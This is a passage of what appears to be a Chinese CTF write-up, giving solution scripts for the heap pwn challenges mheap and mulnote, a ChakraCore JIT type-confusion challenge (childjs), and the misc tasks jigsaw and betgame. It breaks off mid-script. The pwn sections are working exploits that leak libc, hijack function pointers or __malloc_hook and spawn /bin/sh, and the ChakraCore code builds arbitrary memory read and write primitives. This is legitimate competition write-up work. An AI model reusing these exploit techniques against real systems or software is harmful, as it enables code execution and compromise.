:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    modify(<span class="number">0</span>,<span class="number">0x62</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    things = p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(things) &gt;= <span class="number">0x62</span> :</span><br><span class="line">        byte = u8(things[-<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0x40</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;waitting :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    modify(<span class="number">0</span>,<span class="number">0x61</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    things = p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(things) &gt;= <span class="number">0x61</span> :</span><br><span class="line">        byte = u8(things[-<span class="number">3</span>:-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0xd0</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Get it : &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># you can attack it</span></span><br><span class="line">create(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x40</span>,p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(<span class="number">0x404070</span>)*<span class="number">5</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># edit success!!</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x50</span>,p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(<span class="number">0x404070</span>)*<span class="number">7</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_creater = u64(p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - a.symbols[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">system = libc_creater + a.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># use the pointer to get it.</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(system)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h3><p>read 的时候会出错向上写单链表指针控制list<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./mheap&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;112.126.98.5&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">x</span>):</span><br><span class="line">    p.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.rl(<span class="string">&quot;Input size: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(size))</span><br><span class="line">    p.rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sl(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">3840</span>+<span class="number">0x10</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">80</span>,<span class="string">&quot;a&quot;</span>*<span class="number">80</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>,<span class="number">256</span>,p64(<span class="number">0x60</span>)+p64(<span class="number">0x4040e0</span>)+<span class="string">&quot;\x22&quot;</span>*(<span class="number">0xd0</span>-<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">80</span>,<span class="string">&quot;a&quot;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x23330000</span>,p64(<span class="number">0x404050</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_creater = u64(p.rl(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x40680</span></span><br><span class="line">system = <span class="number">0x4f440</span>+libc_creater</span><br><span class="line">modify(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">p.rl(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sl(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a>mulnote</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c</span>(<span class="params">size,data</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">idx</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;R&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>(<span class="params">idx,data</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	io.sendafter(<span class="string">&quot;&gt;&quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>():</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./mulnote&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;112.126.101.96&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">c(<span class="number">0x100</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">r(<span class="number">0</span>)</span><br><span class="line">s()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[0]:\n&#x27;</span>)</span><br><span class="line">lbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="built_in">hex</span>(lbase))</span><br><span class="line">c(<span class="number">0x60</span>,<span class="string">&#x27;tcl&#x27;</span>)</span><br><span class="line">c(<span class="number">0x60</span>,<span class="string">&#x27;tcl&#x27;</span>)</span><br><span class="line">c(<span class="number">0x60</span>,<span class="string">&#x27;tcl&#x27;</span>)</span><br><span class="line">r(<span class="number">1</span>)</span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">r(<span class="number">1</span>)</span><br><span class="line">c(<span class="number">0x60</span>,p64(lbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">c(<span class="number">0x60</span>,p64(lbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">c(<span class="number">0x60</span>,p64(lbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">c(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(lbase+<span class="number">0x4526a</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="childjs"><a href="#childjs" class="headerlink" title="childjs"></a>childjs</h3><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1702">PoC和解析</a><br>真·面向CVE做题</p>
<p>任意地址读<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">o, proto, value</span>) &#123;</span><br><span class="line">    o.<span class="property">b</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> tmp = &#123;<span class="attr">__proto__</span>: proto&#125;;</span><br><span class="line"></span><br><span class="line">    o.<span class="property">a</span> = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line">        <span class="title function_">opt</span>(o, &#123;&#125;, &#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">opt</span>(o, o, <span class="number">0x1234</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">print</span>(o.<span class="property">a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><br>任意地址写<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123;&#125;</span><br><span class="line">obj.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">obj.<span class="property">b</span> = <span class="number">2</span>;</span><br><span class="line">obj.<span class="property">c</span> = <span class="number">3</span>;</span><br><span class="line">obj.<span class="property">d</span> = <span class="number">4</span>;</span><br><span class="line">obj.<span class="property">e</span> = <span class="number">5</span>;</span><br><span class="line">obj.<span class="property">f</span> = <span class="number">6</span>;</span><br><span class="line">obj.<span class="property">g</span> = <span class="number">7</span>;</span><br><span class="line">obj.<span class="property">h</span> = <span class="number">8</span>;</span><br><span class="line">obj.<span class="property">i</span> = <span class="number">9</span>;</span><br><span class="line">obj.<span class="property">j</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>));</span><br><span class="line">dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">BASE</span> = <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + x.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">o, c, value</span>) &#123;</span><br><span class="line">    o.<span class="property">b</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_ inherited__">c</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">let</span> tmp = &#123;<span class="attr">__proto__</span>: proto&#125;;</span><br><span class="line"></span><br><span class="line">    o.<span class="property">a</span> = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line">        <span class="title function_">opt</span>(o, (<span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;), &#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> cons = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    cons.<span class="property"><span class="keyword">prototype</span></span> = o;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">opt</span>(o, o, obj); <span class="comment">// o-&gt;auxSlots = obj (Step 1)</span></span><br><span class="line"></span><br><span class="line">    o.<span class="property">c</span> = dv1; <span class="comment">// obj-&gt;auxSlots = dv1 (Step 2)</span></span><br><span class="line"></span><br><span class="line">    obj.<span class="property">h</span> = dv2; <span class="comment">// dv1-&gt;buffer = dv2 (Step 3)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> read64 = <span class="keyword">function</span>(<span class="params">addr_lo, addr_hi</span>) &#123;</span><br><span class="line">        <span class="comment">// dv2-&gt;buffer = addr (Step 4)</span></span><br><span class="line">        dv1.<span class="title function_">setUint32</span>(<span class="number">0x38</span>, addr_lo, <span class="literal">true</span>);</span><br><span class="line">        dv1.<span class="title function_">setUint32</span>(<span class="number">0x3C</span>, addr_hi, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read from addr (Step 5)</span></span><br><span class="line">        <span class="keyword">return</span> dv2.<span class="title function_">getInt32</span>(<span class="number">0</span>, <span class="literal">true</span>) + dv2.<span class="title function_">getInt32</span>(<span class="number">4</span>, <span class="literal">true</span>) * <span class="variable constant_">BASE</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> write64 = <span class="keyword">function</span>(<span class="params">addr_lo, addr_hi, value_lo, value_hi</span>) &#123;</span><br><span class="line">        <span class="comment">// dv2-&gt;buffer = addr (Step 4)</span></span><br><span class="line">        dv1.<span class="title function_">setUint32</span>(<span class="number">0x38</span>, addr_lo, <span class="literal">true</span>);</span><br><span class="line">        dv1.<span class="title function_">setUint32</span>(<span class="number">0x3C</span>, addr_hi, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to addr (Step 5)</span></span><br><span class="line">        dv2.<span class="title function_">setInt32</span>(<span class="number">0</span>, value_lo, <span class="literal">true</span>);</span><br><span class="line">        dv2.<span class="title function_">setInt32</span>(<span class="number">0</span>, value_hi, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get dv2 vtable pointer</span></span><br><span class="line">    vtable_lo = dv1.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    vtable_hi = dv1.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_">print</span>(<span class="title function_">hex</span>(vtable_lo + vtable_hi * <span class="variable constant_">BASE</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read first vtable entry using the RW primitive</span></span><br><span class="line">    <span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">read64</span>(vtable_lo, vtable_hi)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write a value to address 0x1111111122222222 using the RW primitive (this will crash)</span></span><br><span class="line">    <span class="title function_">write64</span>(<span class="number">0x22222222</span>, <span class="number">0x11111111</span>, <span class="number">0x1337</span>, <span class="number">0x1337</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><br>用这个安全客的脚本修改一下libChakraCore的got表就完事儿了，NX没开，got中的<code>resolve</code>指向bss，跑个shellcode，搞定</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a>jigsaw</h3><p>纯拼图，按照时间排下序完事了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;./pics/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_list</span>(<span class="params">file_path</span>):</span><br><span class="line">    dir_list = os.listdir(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dir_list:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dir_list = <span class="built_in">sorted</span>(dir_list,  key=<span class="keyword">lambda</span> x: os.path.getmtime(os.path.join(file_path, x)))</span><br><span class="line">        <span class="comment"># print(dir_list)</span></span><br><span class="line">        <span class="keyword">return</span> dir_list</span><br><span class="line">list_im = get_file_list(path)</span><br><span class="line">column = <span class="number">21</span></span><br><span class="line">row_num = <span class="number">11</span></span><br><span class="line">width = <span class="number">35</span></span><br><span class="line">height = <span class="number">43</span></span><br><span class="line">imgs = [Image.<span class="built_in">open</span>(path+i) <span class="keyword">for</span> i <span class="keyword">in</span> list_im]</span><br><span class="line">target = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width*column, height*row_num))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_im)):</span><br><span class="line">    <span class="keyword">if</span> i % column == <span class="number">0</span>:</span><br><span class="line">        end = <span class="built_in">len</span>(list_im) <span class="keyword">if</span> i + column &gt; <span class="built_in">len</span>(list_im) <span class="keyword">else</span> i + column </span><br><span class="line">        <span class="keyword">for</span> col, image <span class="keyword">in</span> <span class="built_in">enumerate</span>(imgs[i:i+column]):</span><br><span class="line">            target.paste(image, (width*col, height*(i//column), </span><br><span class="line">                                 width*(col + <span class="number">1</span>), height*(i//column + <span class="number">1</span>)))   </span><br><span class="line">target.show()</span><br></pre></td></tr></table></figure><br>拿到flag <img src="https://hackmd.summershrimp.com/uploads/upload_f47c3d040ed16a129a345190d1caa97d.png" alt=""></p>
<h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;112.125.25.81&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#lis = &#123;&#x27;j&#x27;:&#x27;s&#x27;,&#x27;b&#x27;:&#x27;j&#x27;,&#x27;s&#x27;:&#x27;b&#x27;&#125;</span></span><br><span class="line">lis1 = &#123;<span class="string">&#x27;j&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;j&#x27;</span>&#125;</span><br><span class="line">lis2 = &#123;<span class="string">&#x27;j&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;b&#x27;</span>&#125;</span><br><span class="line">win = <span class="number">0</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sjb</span>():</span><br><span class="line">	rec = io.recvline()[-<span class="number">2</span>]</span><br><span class="line">	io.sendline(rec)</span><br><span class="line">	msg = io.recvline()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;you win&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;win&#x27;</span>)</span><br><span 